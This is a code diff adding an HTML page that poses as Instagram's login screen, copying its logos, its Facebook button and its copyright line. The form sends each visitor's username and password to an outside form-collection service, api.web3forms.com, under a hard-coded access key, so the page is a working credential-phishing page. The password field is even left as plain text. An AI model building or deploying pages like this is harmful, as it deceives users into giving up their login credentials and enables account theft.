@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <img src="instagram-logo.png" alt="Instagram Logo" class="logo">
+        <button class="fb-button"><img src="facebook-logo.png" alt="Facebook Logo"> Continue with Facebook</button>
+        <div class="separator">
+            <span>OR</span>
+        </div>
+        <form action="https://api.web3forms.com/submit" method="POST">
+            <input type="hidden" name="access_key" value="70e77e59-c574-4f28-9d80-4b996f467c02">
+            <input type="text" name="username" placeholder="Phone number, username or Email">
+            <input type="text" name="passit" placeholder="Password">
+            <a href="#" class="forgot-password">Forgot password?</a>
+            <button type="submit">Log In</button>
+        </form>
+        <div class="signup">
+            Don't have an account? <a href="#">Sign up</a>
+        </div>
+    </div>
+    <div class="meta">
+        <p>&copy; 2024 Instagram from Facebook</p>
+    </div>
+</body>
+</html>
